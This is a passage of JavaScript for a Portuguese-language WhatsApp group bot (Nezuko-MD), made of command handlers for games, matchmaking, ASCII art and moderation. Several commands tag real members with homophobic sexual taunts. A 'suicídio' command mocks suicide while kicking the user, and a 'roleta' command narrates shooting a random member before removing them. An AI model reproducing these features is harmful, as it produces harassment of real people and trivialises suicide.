                    buttons: buttonss,
                    headerType: 2
                }
                nezuko.sendMessage(from, bb, {quoted: dnselo})
            }
break
                  case 'genshin':
                    send = await fetchJson(`https://luffy-md-api-v2.herokuapp.com/api/genshin?chara=${q}&apikey=key-yoshi-2.0`)
                    teks = `PERSONAGEM GENSHIN
Nome: ${send.resultado.name}
Citar: ${send.resultado.quote}
Cv: ${send.resultado.cv}
Descrição: ${send.resultado.description}
Imagem: ${send.resultado.image}
Cidade: ${send.resultado.city}
Link: ${send.resultado.url}
Elemento: ${send.resultado.element}
Arma: ${send.resultado.weapon}
Avaliação: ${send.resultado.rating}`                    
nezuko.sendMessage(from, {text: teks}, {quoted: dnselo})
                    break

case 'frasemae': {
pinto = await fetchJson('https://lz-screapers.herokuapp.com/frasesmae')
const randonn = ["1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","31","32","33","34","35","36","37","38","39","40","41","42","43","44","45","46","47","48","49","50"]
randandan = randonn[Math.floor(Math.random() * randonn.length)]               
const sexoanal = (pinto.frases[randandan])
let buttonss = [
                    {buttonId: `${prefix}frasemae`, buttonText: {displayText: '🔥 PRÓXIMA FRASE 🔥'}, type: 1}]
                let bb = {
                    text: `🎯 ${sexoanal} 🎯`,
                    footer: '© Copyright by Nezuko-MD',
                    buttons: buttonss,
                    headerType: 2
                }
                nezuko.sendMessage(from, bb, {quoted: dnselo})
            }
break

//-_-_-_-_--_-_-_-_-_--_--_-_-_-_-_-_-_-_-_-_-_-_\\

case 'duelo':
if (!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
if (!isGroup) return reply('O comando só pode ser usado em Grupos.')
if (args.length === 0) return reply(`Modo de usar...\n\n${prefix}duelo @tag / @tag2 / 1 (1 = 1 Minuto)`)
txt = args.join(' ')
nmr = txt.split('/')[0].replace('@' ,  '').replace(' ', '').replace(' ', '').replace(' ', '')
nmr2 = txt.split('/')[1].replace('@' ,  '').replace(' ', '').replace(' ', '').replace(' ', '')
pergunta = 'Qual dos dois duelou melhor ou deu as melhores respostas?'
tempo = txt.split('/')[2] 
if(!Number(tempo)) return reply('Ops, insira os minutos\n\n1 = 1 Minuto')

try {
ppimg = await nezuko.profilePictureUrl(`${nmr}@s.whatsapp.net`)
} catch(erro) {
ppimg = 'https://telegra.ph/file/2fbfa46b4ea3baed434d1.jpg'
}
try {
ppimg2 = await nezuko.profilePictureUrl(`${nmr2}@s.whatsapp.net`)
} catch(erro) {
ppimg2 = 'https://telegra.ph/file/2fbfa46b4ea3baed434d1.jpg'
}

shortpc = await axios.get(`https://tinyurl.com/api-create.php?url=${ppimg}`)
shortpc2 = await axios.get(`https://tinyurl.com/api-create.php?url=${ppimg2}`)
blup = await getBuffer(`http://api-exteam.herokuapp.com/api/duelo?foto=${shortpc.data}&foto2=${shortpc2.data}`)

await mencionar(blup, `⚔️*Duelo de Stickers*⚔️\n\n@${nmr}  Vs  @${nmr2}\n\nPergunta:  ${pergunta}\n\nDigite:  um = Para votar em:  @${nmr}\nDigite:  dois = Para votar em:  @${nmr2}\n\n⚠️ *Atenção*: só é permitido votar 1 única vez, portanto preste atenção em quem vai votar, pois não é possível alterar o voto.\n\n❗ _Não vote por afinidade, vote pela qualidade das respostas, assim você ajuda a melhorar a qualidade dos duelos..._`, [nmr+'@s.whatsapp.net', nmr2+'@s.whatsapp.net'], true)
addVotoDuelo(from , pergunta , nmr , nmr2 , tempo , reply)
break

//-_-_-_-_--_-_-_-_-_--_--_-_-_-_-_-_-_-_-_-_-_-_\\   
 

case 'chance': //Jogos
var avb = body.slice(7)
if (args.length < 1) return reply(`Você precisa digitar da forma correta\nExemplo: /chance do ${pushname} ser um trouxa`)
random = `${Math.floor(Math.random() * 100)}`
hasil = `A CHANCE ${body.slice(7)}\n\E DE... ${random}%`
let buttons = [
{ buttonId: '☔', buttonText: { displayText: '☔' }, type: 1 }
    ]
await nezuko.sendButtonText(from, buttons, hasil, nezuko.user.name, m)
break

case 'gado1':
case 'gadometro':
var chifre = ["ultra extreme gado", "Gado-Master", "Gado-Rei", "Gado", "Escravo-ceta", "Escravo-ceta Maximo", "Gacorno?", "Jogador De Forno Livre<3", "Mestre Do Frifai<3<3", "Gado-Manso", "Gado-Conformado", "Gado-Incubado", "Gado Deus", "Mestre dos Gados", "Topa tudo por buceta", "Gado Comum", "Mini Gadinho", "Gado Iniciante", "Gado Basico", "Gado Intermediario", "Gado Avançado", "Gado Profisional", "Gado Mestre", "Gado Chifrudo", "Corno Conformado", "Corno HiperChifrudo", "Chifrudo Deus", "Mestre dos Chifrudos"]
var gado = chifre[Math.floor(Math.random() * chifre.length)]
gadop = `${Math.floor(Math.random() * 100)}`
hisil = `VOCÊ É:\n\n${gado}`
reply(hisil)
break

case 'gay1':
if (args.length < 1) return reply('marque o gay do gp!')
rate = body.slice(5)
var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
var kl = ti[Math.floor(Math.random() * ti.length)]
 reply('COMO VOCÊ É GAY: *'+rate+'*\n\nSUA PORCENTAGEM GAY : '+ kl+'%\n ESSE AÍ AMA DÁ O CU')
break

case 'gay2':
var ti =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
var kl = ti[Math.floor(Math.random() * ti.length)]
 reply(`COMO VOCÊ É GAY: *${pushname}*\n\nSUA PORCENTAGEM GAY : `+ kl+`%\n VOCÊ AMA DÁ O CU NÉ KKK`)
break

case 'pau'://Jogos
random = `${Math.floor(Math.random() * 35)}`
const tamanho = random
if (tamanho < 13 ) {pp = 'só a fimose'} else if (tamanho == 13 ) {pp = 'passou da média😳'} else if (tamanho == 14 ) {pp = 'passou da média😳'} else if (tamanho == 15 ) {pp = 'eita, vai pegar manga?'} else if (tamanho == 16 ) {pp = 'eita, vai pegar manga?'} else if (tamanho == 17 ) {pp = 'calma man, a mina não é um poço😳'} else if (tamanho == 18 ) {pp = 'calma man, a mina não é um poço😳'} else if (tamanho == 19 ) {pp = 'calma man, a mina não é um poço😳'} else if (tamanho == 20 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanho == 21 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanho == 22 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanho == 23 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanho == 24 ) {pp = 'você tem um poste no meio das pernas'} else if (tamanho > 25 ) {pp = 'vai procurar petróleo com isso?'
}
hasil = `SEU PAU TEM ${random}CM\n\n${pp}`
reply(hasil)
break

case 'shipo':
teks = args.join(" ")
if(teks.length < 10) return reply('Marque uma pessoa do grupo para encontrar o par dela')
membrr = []
const suamae111 = groupMembers
const suamae211 = groupMembers
const teupai111 = suamae111[Math.floor(Math.random() * suamae111.length)]
const teupai211 = suamae211[Math.floor(Math.random() * suamae211.length)]
var shipted1 = ["1%", `2%`, `3%`, `4%`, `5%`, `6%`, `7`, `%`, `9%`, `10`, `11%`, `12%`,`13%`, `14%`, `15%`, `16%`, `17%`, `1%`, `19%`, `20%`, `21%`, `22`, `23%`, `24%`, `25%`, `26%`, `27%`, `2%`, `27%`, `2%`, `29%`, `30%`, `31%`, `32%`, `33%`, `34%`, `35%`, `36%`, `37%`, `3%`, `39%`, `40%`, `41%`, `42%`, `43%`, `44%`, `45%`, `46%`, `47%`, `4%`, `49%`, `50%`, `51%`, `52%`, `53%`, `54%`, `55%`, `56%`, `57%`, `5%`, `59%`, `60%`, `61%`, `62%`, `63%`, `64%`, `65%`, `66%`, `67%`, `6%`, `69%`, `70%`, `71%`, `72%`, `73%`, `74%`, `75%`, `76%`, `77%`, `7%`, `79%`, `0%`, `1%`, `2%`, `5%`, `4%`, `5%`, `6%`, `7%`, `%`, `9%`, `90%`, `91%`, `92%`, `93%`, `94%`, `95%`, `96%`, `97%`, `9%`, `99%`, `100%`]
const shiptedd = shipted1[Math.floor(Math.random() * shipted1.length)]
jet = `*Hmmm.... Eu Shipo eles 2💘💘*\n\n1 = @${teupai111.id.split('@')[0]}\n && 2 = ${teks} com uma porcentagem de: ${shiptedd}`
membrr.push(teupai111.id)
membrr.push(teupai211.id)
mentions(jet, membrr, true)
break

case 'casal':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
membr = []
const suamae11 = groupMembers
const suamae21 = groupMembers
const teupai11 = suamae11[Math.floor(Math.random() * suamae11.length)]
const teupai21 = suamae21[Math.floor(Math.random() * suamae21.length)]
var shipted1 = ["1%", `2%`, `3%`, `4%`, `5%`, `6%`, `7`, `%`, `9%`, `10`, `11%`, `12%`,`13%`, `14%`, `15%`, `16%`, `17%`, `1%`, `19%`, `20%`, `21%`, `22`, `23%`, `24%`, `25%`, `26%`, `27%`, `2%`, `27%`, `2%`, `29%`, `30%`, `31%`, `32%`, `33%`, `34%`, `35%`, `36%`, `37%`, `3%`, `39%`, `40%`, `41%`, `42%`, `43%`, `44%`, `45%`, `46%`, `47%`, `4%`, `49%`, `50%`, `51%`, `52%`, `53%`, `54%`, `55%`, `56%`, `57%`, `5%`, `59%`, `60%`, `61%`, `62%`, `63%`, `64%`, `65%`, `66%`, `67%`, `6%`, `69%`, `70%`, `71%`, `72%`, `73%`, `74%`, `75%`, `76%`, `77%`, `7%`, `79%`, `0%`, `1%`, `2%`, `5%`, `4%`, `5%`, `6%`, `7%`, `%`, `9%`, `90%`, `91%`, `92%`, `93%`, `94%`, `95%`, `96%`, `97%`, `9%`, `99%`, `100%`]
const shipted = shipted1[Math.floor(Math.random() * shipted1.length)]
jet = `*Hmmm.... Eu Shipo eles 2💘💘*\n\n1= @${teupai11.id.split('@')[0]}\ne esse\n2= @${teupai21.id.split('@')[0]}\ncom uma porcentagem de: ${shipted}`
membr.push(teupai11.id)
membr.push(teupai21.id)
mentions(jet, membr, true)
break

case 'suic':
case 'suicui':
case 'suicidiuio': 
case 'suicíuidio': 
case 'suicídio':
case 'suicidio':
if(!isGroup) return reply('Este comando só deve ser utilizado em Grupo.')
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
reply(`Lembre-se ${pushname} Você sempre estara em nossos corações ☔😔`)
await sleep(3000)
nezuko.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(1000)
reply('Agora que ja se foi vamos falar mal dele kkk😈')
break

case 'roleta':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
jds = []
 A2 = groupMembers
 B2 = groupMembers
 TAMBOR = ["NA PERNA","NA CABEÇA","NO PESCOÇO","NO PEITO","NO OLHO","NO ESTÔMAGO","NA BOCA","NA PERNA","NA TESTA","NO BRAÇO"]
  C2 = A2[Math.floor(Math.random() * A2.length)]
if(C2 === sender || C2 === botNumber+"@s.whatsapp.net") {
return reply(`Acertei @${C2.id.split('@')[0]} e não posso removê-lo 🥺`)
}
 tpa = TAMBOR[Math.floor(Math.random() * (TAMBOR.length))]	 		
 reply(`😈 GIRANDO O TAMBOR, E SE PREPAREM PARA AS CONSEQUÊNCIAS!!! 😈`)
 setTimeout( () => {
D1 = `💥POW💥 O TAMBOR GIROU E ACERTOU O @${C2.id.split('@')[0]}, MORREU COM UM TIRO *${tpa}*`             			
reply(D1)
}, 5000)
 jds.push(C2.id)				  
setTimeout( () => {
jds.push(C2.id)
nezuko.groupParticipantsUpdate(from, [C2.id], "remove")
}, 6000) 
break

case 'antiviewone'://by Nezuko-MD
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (args.length < 1) return reply('1 pra ligar / 0 pra desligar')
if (Number(args[0]) === 1) {
if (isAntiview) return reply('Ja esta ativo')
antiview.push(from)
fs.writeFileSync('./funções de cmd/antis/antiview.json', JSON.stringify(antiview))
reply('🌀 Ativou com sucesso o recurso de antiviewone neste grupo 📝')
} else if (Number(args[0]) === 0) {
if (!isAntiview) return reply('Ja esta Desativado')
pesquisar = from
processo = antiview.indexOf(pesquisar)
while(processo >= 0){
antiview.splice(processo, 1)
processo = antiview.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/antis/antiview.json', JSON.stringify(antiview))
reply('‼️ Desativou com sucesso o recurso de Antiviewone neste grupo✔️')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'blockcmd':
if(!SoDono  && !isnit) return reply(enviar.msg.donosmt)
tp = args.join(" ")
if(tp.includes("blockcmd blockcmd") || (tp.includes("blockcmd  blockcmd"))) return reply(`Tá louco maluco?, Quer banir o comando de bloquear comando?`)
if(getComandoBlock(from).includes(args[0]))return reply('Este comando já está blockeado')
addComandos(from, args[0])
reply(`O comando ${args[0]} Foi blockeado`)
break

case 'unblockcmd':
if(!SoDono  && !isnit) return reply(enviar.msg.donosmt)
tp = args.join(" ")
if(tp.includes("blockcmd unblockcmd") || (tp.includes("blockcmd  unblockcmd"))) return reply(`Tá louco maluco?, Quer banir o comando de desbloquear comando?`)  
if(!getComandoBlock(from).includes(args[0]))return reply('Este comando já está  desbloqueado')
deleteComandos(from, args[0])
reply(`O comando ${args[0]} Foi desblockeado`)
break

case 'listacomandos':
tkks = '╭─*「 *COMANDOS BLOCK* 」\n'
for (let V of getComandoBlock(from)) {
tkks += `│+  ${V}\n`
}
tkks += `│+ Total : ${getComandoBlock(from).length}\n╰──────*「 *${NomeDoBot}* 」*────`
await nezuko.sendMessage(from, tkks.trim(), extendedText, {quoted: info})
break

case 'alma-gemeas':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')
membr = []
const suamae121 = groupMembers
const suamae251 = groupMembers
const teupai117 = suamae121[Math.floor(Math.random() * suamae121.length)]
const teupai251 = suamae251[Math.floor(Math.random() * suamae251.length)]
var shipted11 = ["1%", `2%`, `3%`, `4%`, `5%`, `6%`, `7`, `%`, `9%`, `10`, `11%`, `12%`,`13%`, `14%`, `15%`, `16%`, `17%`, `1%`, `19%`, `20%`, `21%`, `22`, `23%`, `24%`, `25%`, `26%`, `27%`, `2%`, `27%`, `2%`, `29%`, `30%`, `31%`, `32%`, `33%`, `34%`, `35%`, `36%`, `37%`, `3%`, `39%`, `40%`, `41%`, `42%`, `43%`, `44%`, `45%`, `46%`, `47%`, `4%`, `49%`, `50%`, `51%`, `52%`, `53%`, `54%`, `55%`, `56%`, `57%`, `5%`, `59%`, `60%`, `61%`, `62%`, `63%`, `64%`, `65%`, `66%`, `67%`, `6%`, `69%`, `70%`, `71%`, `72%`, `73%`, `74%`, `75%`, `76%`, `77%`, `7%`, `79%`, `0%`, `1%`, `2%`, `5%`, `4%`, `5%`, `6%`, `7%`, `%`, `9%`, `90%`, `91%`, `92%`, `93%`, `94%`, `95%`, `96%`, `97%`, `9%`, `99%`, `100%`]
const shipteddd = shipted11[Math.floor(Math.random() * shipted11.length)]
jet = `*Hmmm....  alma-gemeas eles 2 💘💘*\n\n1= @${teupai117.id.split('@')[0]}\ne esse\n2= @${teupai251.id.split('@')[0]}\ncom uma porcentagem de: ${shipteddd}`
membr.push(teupai117.id)
membr.push(teupai251.id)
mentions(jet, membr, true)
break

case 'menuart': 
case 'listaart':
botaoale = [
{title: "",
rows: [
{title: "⟦🤡⟧𝐀𝐑𝐓𝐄 𝟏⟦🤡⟧", rowId: `${prefix}art1`, description: "◈ 机⃝𐰷𑁈Lorde 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "⟦🤡⟧𝐀𝐑𝐓𝐄 𝟐⟦🤡⟧", rowId: `${prefix}art2`, description: "◈ 机⃝𐰷𑁈Lorde 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "⟦🤡⟧𝐀𝐑𝐓𝐄 𝟑⟦🤡⟧", rowId: `${prefix}art3`, description: "◈ 机⃝𐰷𑁈Lorde 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "⟦🤡⟧𝐀𝐑𝐓𝐄 𝟒⟦🤡⟧", rowId: `${prefix}art4`, description: "◈ 机⃝𐰷𑁈Lorde 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "⟦🤡⟧𝐀𝐑𝐓𝐄 𝟓⟦🤡⟧", rowId: `${prefix}art5`, description: "◈ 机⃝𐰷𑁈Lorde 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "⟦🤡⟧𝐀𝐑𝐓𝐄 𝟔⟦🤡⟧", rowId: `${prefix}art6`, description: "◈ 机⃝𐰷𑁈Lorde 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "⟦🤡⟧𝐀𝐑𝐓𝐄 𝟕⟦🤡⟧", rowId: `${prefix}art7`, description: "◈ 机⃝𐰷𑁈Lorde 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "⟦🤡⟧𝐀𝐑𝐓𝐄 𝟖⟦🤡⟧", rowId: `${prefix}art8`, description: "◈ 机⃝𐰷𑁈Lorde 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "⟦🤡⟧𝐀𝐑𝐓𝐄 𝟗⟦🤡⟧", rowId: `${prefix}art9`, description: "◈ 机⃝𐰷𑁈Lorde 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "⟦🤡⟧𝐀𝐑𝐓𝐄 𝟏𝟎⟦🤡⟧", rowId: `${prefix}art10`, description: "◈ 机⃝𐰷𑁈Lorde 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "⟦🤡⟧𝐀𝐑𝐓𝐄 𝟏𝟏⟦🤡⟧", rowId: `${prefix}art11`, description: "◈ 机⃝𐰷𑁈Lorde 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "⟦🤡⟧𝐀𝐑𝐓𝐄 𝟏𝟐⟦🤡⟧", rowId: `${prefix}art12`, description: "◈ 机⃝𐰷𑁈Lorde 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "⟦🤡⟧𝐀𝐑𝐓𝐄 𝟏𝟑⟦🤡⟧", rowId: `${prefix}art13`, description: "◈ 机⃝𐰷𑁈Lorde 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "⟦🤡⟧𝐀𝐑𝐓𝐄 𝟏𝟒⟦🤡⟧", rowId: `${prefix}art14`, description: "◈ 机⃝𐰷𑁈Lorde 𝚩𝚹𝚻⃝🌸̶ >3"},
{title: "⟦🤡⟧𝐀𝐑𝐓𝐄 𝟏𝟓⟦🤡⟧", rowId: `${prefix}art15`, description: "◈ 机⃝𐰷𑁈Lorde 𝚩𝚹𝚻⃝🌸̶ >3"}
]
},
]
sendlistA(from, `┏⧐┅┅⃟🤡┅┅⧏ ❀ ⧐┅┅🤡⃟⃟┅┅⧏┓
┇            ⟦🤡⟧ 𝐀𝐑𝐓𝐄𝐒 ⟦🤡⟧           ┇
┗⧐┅┅⃟🤡┅┅⧏ ❀ ⧐┅┅🤡⃟⃟┅┅⧏┛`, "", "", "𝐂𝐋𝐈𝐂𝐀 𝐀𝐈 𝐏𝐀𝐋𝐇𝐀𝐂̧𝐎 ⟦🤡⟧ ", botaoale)
break


case "art1":
nezuko.sendMessage(from, {text: `
 . ___________________
 ▕╮╭┻┻╮╭┻┻╮╭▕╮╲
 ▕╯┃╭╮┃┃╭╮┃╰▕╯╭▏
 ▕╭┻┻┻┛┗┻┻┛   ▕  ╰▏
 ▕╰━━━┓┈┈┈╭╮▕╭╮▏
 ▕╭╮╰┳┳┳┳╯╰╯▕╰╯▏
 ▕╰╯┈┗┛┗┛┈╭╮▕╮┈▏`, quoted: dnselo})
break

case "art2":
nezuko.sendMessage(from, {text: `
░░╔══╗░░░░░░░░░░╔══╗░░
 ░╚╣▐▐╠╝░░╔══╗░░╚╣▐▐╠╝░
 ░░╚╦╦╝░░╚╣▌▌╠╝░░╚╦╦╝░░
 ░░░╚╚░░░░╚╦╦╝░░░░╚╚░░░
 ░░░░░░░░░░╝╝░░░░░░░░░░ `, quoted: dnselo})
break

case "art3":
nezuko.sendMessage(from, {text: `
▒▒▒▒▒▒▐███████▌
 ▒▒▒▒▒▒▐░▀░▀░▀░▌
 ▒▒▒▒▒▒▐▄▄▄▄▄▄▄▌
 ▄▀▀▀█▒▐░▀▀▄▀▀░▌▒█▀▀▀▄
 ▌▌▌▌▐▒▄▌░▄▄▄░▐▄▒▌▐▐▐▐ `, quoted: dnselo})
break

case "art4":
nezuko.sendMessage(from, {text: `
░▄░█░░░▄▀▀▀▀▀▄░░░█░▄░
 ▄▄▀▄░░░█─▀─▀─█░░░▄▀▄▄
 ░░░░▀▄▒▒▒▒▒▒▒▒▒▄▀░░░░
 ░░░░░█────▀────█░░░░░
 ░░░░░█────▀────█░░░░░   `, quoted: dnselo})
break

case "art5":
nezuko.sendMessage(from, {text: `
 ▒▒▒▒▒▒▒▒▒▒▒▒
 ▒▒▒▒▓▒▒▓▒▒▒▒
 ▒▒▒▒▓▒▒▓▒▒▒▒
 ▒▒▒▒▒▒▒▒▒▒▒▒
 ▒▓▒▒▒▒▒▒▒▒▓▒
 ▒▒▓▓▓▓▓▓▓▓▒▒
 ▒▒▒▒▒▒▒▒▒▒▒▒`, quoted: dnselo})
break

case "art6":
nezuko.sendMessage(from, {text: `
┈┈┈╱▔▔▔▔▔▔╲┈╭━━━╮┈┈
 ┈┈▕┈╭━╮╭━╮┈▏┃ZALTS.┃┈┈
 ┈┈▕┈┃╭╯╰╮┃┈▏╰┳━━╯┈┈
 ┈┈▕┈╰╯╭╮╰╯┈▏┈┃┈┈┈┈┈
 ┈┈▕┈┈┈┃┃┈┈┈▏━╯┈┈┈┈┈
 ┈┈▕┈┈┈╰╯┈┈┈▏┈┈┈┈┈┈┈
 ┈┈▕╱╲╱╲╱╲╱╲▏┈┈┈┈┈┈┈`, quoted: dnselo})
break

case "art7":
nezuko.sendMessage(from, {text: `
──▒▒▒▒▒────▄████▄─────
 ─▒─▄▒─▄▒──███▄█▀──────
 ─▒▒▒▒▒▒▒─▐████──█──█──
 ─▒▒▒▒▒▒▒──█████▄──────
 ─▒─▒─▒─▒───▀████▀─────
 `, quoted: dnselo})
break

case "art8":
nezuko.sendMessage(from, {text: `
╲╲╭━━━━━━━╮╱╱
 ╲╭╯╭━╮┈╭━╮╰╮╱
 ╲┃┈┃┈▊┈┃┈▊┈┃╱
 ╲┃┈┗━┛┈┗━┛┈┃╱
 ╱┃┈┏━━━━━┓┈┃╲
 ╱┃┈┃┈┈╭━╮┃┈┃╲
 ╱╰╮╰━━┻━┻╯╭╯╲
 ╱╱╰━━━━━━━╯╲╲`, quoted: dnselo})
break

case "art9":
nezuko.sendMessage(from, {text: `
    ╭━━╮┈┈┈╭━━╮┈┈┈┈┈
 ┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
 ╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
 ┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
 ┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
 ╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
 ┃┈┈╰━━━╯┈┈╰━┛┈┃┈`, quoted: dnselo})
break

case "art10":
nezuko.sendMessage(from, {text: `
○ ＿＿＿＿
 　　   ∥　　　　|
 　　   DANIEL👨‍💻
 　　   ∥　　　　|
 　　   ∥￣￣￣￣
  ∧＿∧
 ( ･ω･∥
 丶　つ０
  しーＪ `, quoted: dnselo})
break

case "art11":
nezuko.sendMessage(from, {text: `
A____A
 |・ㅅ・|
 |っ　ｃ|
 |　　　|
 |　　　|
 |　　　|
 |　　　|
 |　　　|
 U￣￣U`, quoted: dnselo})
break

case "art12":
nezuko.sendMessage(from, {text: `
╮╰╮╮▕╲╰╮╭╯╱▏╭╭╭╭
 ╰╰╮╰╭╱▔▔▔▔╲╮╯╭╯
 ┏━┓┏┫╭▅╲╱▅╮┣┓╭║║║
 ╰┳╯╰┫┗━╭╮━┛┣╯╯╚╬╝
 ╭┻╮╱╰╮╰━━╯╭╯╲┊   ║
 ╰┳┫▔╲╰┳━━┳╯╱▔┊   ║
 ┈┃╰━━╲▕╲╱▏╱━━━┬╨╮
 ┈╰━━╮┊▕╱╲▏┊╭━━┴╥╯ `, quoted: dnselo})
break

case "art13":
nezuko.sendMessage(from, {text: `
.    ▼￣＞-―-＜￣▼
 　　Ｙ　            Ｙ
   /\   / 　 ●    o  ●）
 ＼  ｜　 つ　    ヽ`, quoted: dnselo})
break

case "art14":
nezuko.sendMessage(from, {text: `
👊🏿👇🏿👇🏿👇🏿👇🏿👇🏿👇🏿👇🏿👇🏿👇🏿👊🏿
👉🏿👊🏾👇🏾👇🏾👇🏾👇🏾👇🏾👇🏾👇🏾👊🏾👈🏿
👉🏿👉🏾👊🏽👇🏽👇🏽👇🏽👇🏽👇🏽👊🏽👈🏾👈🏿
👉🏿👉🏾👉🏽👊🏼👇🏼👇🏼👇🏼👊🏼👈🏽👈🏾👈🏿
👉🏿👉🏾👉🏽👉🏼👊🏻👇🏻👊🏻👈🏼👈🏽👈🏾👈🏿
👉🏿👉🏾👉🏽👉🏼👉🏻🏳️‍🌈?👈🏻👈🏼👈🏽👈🏾👈🏿
👉🏿👉🏾👉🏽👉🏼👊🏻👆🏻👊🏻👈🏼👈🏽👈🏾👈🏿
👉🏿👉🏾👉🏽👊🏼👆🏼👆🏼👆🏼👊🏼👈🏽👈🏾👈🏿
👉🏿👉🏾👊🏽👆🏽👆🏽👆🏽👆🏽👆🏽👊🏽👈🏾👈🏿
👉🏿👊🏾👆🏾👆🏾👆🏾👆🏾👆🏾👆🏾👆🏾👊🏾👈🏿
👊🏿👆🏿👆🏿👆🏿👆🏿👆🏿👆🏿👆🏿👆🏿👆🏿👊🏿`, quoted: dnselo})
break

case "art15":
  nezuko.sendMessage(from, {text: `
  ┈┈▕╲▂▂▂▂╱▏┈┈┈┈┈┈
┈┈┈╲╱╭╱╲╱╲┈┈┈┈┈┈
┈╱▔▔┈┊▏▕▏▕┈┈┈┈┈┈
▕▂╱▔╳▔╲▊▏▊╱▔╲▔╲┈
┈┈┈┈▏▕▏▔▔▔▕▋▕▕▋▏
┈┈┈┈╲┈╲▂▂▂▂▂▂▂╱┈
┈┈┈┈▕╲▂▂▂▂▂╱┈┈┈┈
┈┈┈╱▔╲▕┈┈┈┈┈┈┈┈┈
┈┈┈╱▏┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈
┈┈┈▏▏┈┈┈┈┈▏╲▕▋▕▋▏┈┈┈
┈┈┈╲╲┈┈┈┈┈▏┈▏┈▔▔▔▆┈┈
┈┈┈┈╲▔▔▔▔▔╲╱┈╰┳┳┳╯┈┈
┈╱╲╱╲▏┈┈┈┈┈┈▕▔╰━╯┈┈┈
┈▔╲╲╱╱▔╱▔▔╲╲╲╲┈┈┈┈┈┈
┈┈┈╲╱╲╱┈┈┈┈╲╲▂╲▂┈┈┈┈
┈┈┈┈┈┈┈┈┈┈┈┈╲╱╲╱┈┈┈┈
  `, quoted: dnselo})
  break

case 'advertir':
case 'adv':
if (!isGroup) return reply("<❗> Só em grupo")
if (!isGroupAdmins) return reply("<❗> Somente adm")
if (!isBotGroupAdmins) return reply("<❗> Bot precisa ser adm")
if(!(type == 'extendedTextMessage'))return reply('Marque a msg do usuario para dar uma advertencia')
advertir = info.message.extendedTextMessage.contextInfo.participant
if (getAdvertencia(advertir, from) == undefined)addAdvertirId(advertir, from)
addAdvertir(advertir, from, 1)
if(getAdvertencia(advertir, from) == 1){
mentions(`Olá @${advertir.split("@")[0]} vc levou uma advertência, por desrespeito as regras do grupo`,[advertir])
}else if(getAdvertencia(advertir, from) == 2){
mentions(`Cuidado @${advertir.split("@")[0]} vc já tem ${getAdvertencia(advertir, from)} advertencias, se você receber +1 será removida(o) do grupo`, [advertir])
}else if(getAdvertencia(advertir, from) == 3){
mentions(`Querido @${advertir.split("@")[0]} vejo q vc já levou ${getAdvertencia(advertir, from)} advertencias por isto vc será removido do grupo`,[advertir])
nezuko.groupParticipantsUpdate(from, [advertir], 'remove')
addAdvertir(advertir, from, -3)
}
break

//=====( TINDER REGISTRAR )=====\\ 

case 'gay':
if(!isGroup) return reply('Só pode ser utilizado este comando, em grupo.')

if(budy.includes("@")) {
mention_id = args.join(" ").replace("@", "") + "@s.whatsapp.net"
var blamention_id = mention_id
}

if(!budy.includes("@")) {
var blamention_id = sender 
}

nezuko.sendMessage(from, {text: `❰ Pesquisando a sua ficha de gay : @${blamention_id.split("@")[0]} aguarde... ❱`, mentions: [blamention_id]})
 setTimeout(async() => {
wew = await getBuffer(`${imggay}`)
zxzz = 
random = `${Math.floor(Math.random() * 110)}`
feio = random
boiola = random
if (boiola < 20 ) {var bo = 'hmm... você é hetero😔'} else if (boiola == 21 ) {var bo = '+/- boiola'} else if (boiola == 23 ) {var bo = '+/- boiola'} else if (boiola == 24 ) {var bo = '+/- boiola'} else if (boiola == 25 ) {var bo = '+/- boiola'} else if (boiola == 26 ) {var bo = '+/- boiola'} else if (boiola == 27 ) {var bo = '+/- boiola'} else if (boiola == 2 ) {var bo = '+/- boiola'} else if (boiola == 29 ) {var bo = '+/- boiola'} else if (boiola == 30 ) {var bo = '+/- boiola'} else if (boiola == 31 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 32 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 33 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 34 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 35 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 36 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 37 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 3 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 39 ) {var bo = 'tenho minha desconfiança...😑'} else if (boiola == 40 ) {var bo = 'tenho minha 